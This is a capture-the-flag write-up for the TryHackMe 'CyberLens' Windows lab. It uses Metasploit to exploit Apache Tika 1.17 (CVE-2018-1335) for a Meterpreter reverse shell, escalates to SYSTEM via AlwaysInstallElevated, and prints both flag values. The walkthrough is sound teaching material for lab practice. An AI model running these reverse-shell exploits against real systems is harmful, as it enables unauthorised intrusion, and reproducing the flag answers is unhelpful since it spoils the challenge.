# TryHackMe — CyberLens Writeup

**Difficulty:** Easy  
**OS:** Windows  
**Author:** Abdelilah (cat0x01)  

---

## Reconnaissance

```bash
nmap -sS -sV -Pn 10.130.174.195 -p- -T4
```

Key ports found:

| Port | Service |
|------|---------|
| 445 | SMB |
| 3389 | RDP |
| 5985 | WinRM |
| 61777 | Jetty (Apache Tika 1.17) |

---

## Enumeration

```bash
curl -s http://10.130.174.195:61777/
```

Confirmed Apache Tika 1.17 Server running on port 61777.

---

## Initial Access — CVE-2018-1335 (Tika RCE)

Apache Tika 1.17 is vulnerable to CVE-2018-1335, a server-side request
forgery that allows remote code execution via a crafted JP2 file header.

```bash
use exploit/windows/http/apache_tika_jp2_jscript
set RHOSTS 10.130.174.195
set RPORT 61777
set LHOST tun0
set LPORT 4444
run
```

Got Meterpreter shell as `CyberLens` user.

---

## User Flag

```bash
search -f user.txt -d C:\\Users
cat "C:\Users\CyberLens\Desktop\user.txt"
```
THM{T1k4-CV3-f0r-7h3-w1n}

---

## Privilege Escalation — AlwaysInstallElevated

```bash
run post/multi/recon/local_exploit_suggester
```

`always_install_elevated` flagged as confirmed vulnerable.

The `AlwaysInstallElevated` registry keys are set to 1 in both HKLM and HKCU,
allowing any user to install MSI packages with SYSTEM privileges.

```bash
background
use exploit/windows/local/always_install_elevated
set SESSION 1
set LHOST tun0
set LPORT 5555
run
```

Got `NT AUTHORITY\SYSTEM`.

---

## Root Flag

```bash
cd C:/Users/Administrator/Desktop
cat admin.txt
```
THM{3lev@t3D-4-pr1v35c!}

---

## Lessons Learned

- Enumerate every service, even on obscure ports
- Always run `local_exploit_suggester` on Windows for privesc
- Set `LHOST` to `tun0`, not the default interface

---

## Summary

| Field | Value |
|-------|-------|
| Initial access | Apache Tika 1.17 RCE (CVE-2018-1335) |
| Privilege escalation | AlwaysInstallElevated MSI abuse |
| User flag | `THM{T1k4-CV3-f0r-7h3-w1n}` |
| Root flag | `THM{3lev@t3D-4-pr1v35c!}` |
